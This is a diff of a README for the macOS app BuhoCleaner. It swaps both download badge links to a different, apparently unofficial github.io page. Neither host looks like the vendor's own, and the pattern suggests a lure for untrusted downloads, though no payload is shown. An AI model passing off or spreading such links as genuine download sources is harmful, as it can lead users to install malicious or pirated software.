@@ -7,7 +7,7 @@ Whether you’re battling junk files, startup bloat, or app leftovers, BuhoClean
 ---
 
 ## ✅ Download BuhoCleaner for macOS  
-[![Download BuhoCleaner](https://img.shields.io/badge/Download-BuhoCleaner-blueviolet)](https://buhocleaner-download-mac.github.io/.github)
+[![Download BuhoCleaner](https://img.shields.io/badge/Download-BuhoCleaner-blueviolet)](https://shuziktobehuman.github.io/huja/buhocleaner)
 
 ---
 
@@ -60,7 +60,7 @@ BuhoCleaner is a professional-grade macOS maintenance app that makes system opti
 
 ---
 
-[![Download BuhoCleaner](https://img.shields.io/badge/Download-BuhoCleaner-blueviolet)](https://buhocleaner-download-mac.github.io/.github)
+[![Download BuhoCleaner](https://img.shields.io/badge/Download-BuhoCleaner-blueviolet)](https://shuziktobehuman.github.io/huja/buhocleaner)
 
 ---
 
